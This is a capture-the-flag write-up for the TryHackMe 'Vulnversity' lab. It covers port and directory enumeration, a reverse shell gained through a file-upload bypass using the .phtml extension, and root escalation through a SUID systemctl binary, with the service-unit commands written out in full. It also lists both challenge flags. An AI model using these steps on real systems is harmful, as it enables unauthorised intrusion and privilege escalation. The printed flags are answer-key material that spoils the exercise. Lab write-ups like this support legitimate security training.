# THM - Vulnversity
**recon - privilege_escalate - reverse_shell**

## Enumeration
IP Address : 10.10.169.247
### 1.1 
#### nmap
**nmap -A 10.10.169.247**
./nmap file
=> 3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
### 1.2 
#### gobuster
**gobuster dir -u http://10.10.169.247 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt** 
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/internal (Status: 301)
**gobuster dir -u http://10.10.169.247:3333/internal -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt** 
/uploads
### 1.2 
#### nikto
**nikto -h http://10.10.169.247:3333** 
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/internal (Status: 301)

### Conclusion, vulnerabilities
In /internal it's possible to upload files. It's maby a revshell possibility with activation in /uploads.
## Exploit
### 1.1
#### Reverse shell
Name file reverse.phtml and upload, clic in /uploads and it's a reverse shell !
**python -c 'import pty; pty.spawn("/bin/bash")'** for stabilize shell.
In /home/bill => bill.txt

### Conclusion
It was possible to inject revshell.

## Privilege escalation
### 1.1
#### sudo
**find / -perm -4000 -print 2>&1**
Search for /bin/systemctl and find a possible vulnerability : 
**cd /bin**
**sh**
TF=$(mktemp).service
echo '[Service]
Type=oneshot**
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF**
**cat /tmp/output**
### Conclusion
With suid permission, it was possible to open an bash with root id
## Responses
### What is the user flag? : 
**THM{63e5bce9271952aad1113b6f1ac28a07}**
### What is the root flag? : 
**THM{6637f41d0177b6f37cb20d775124699f}**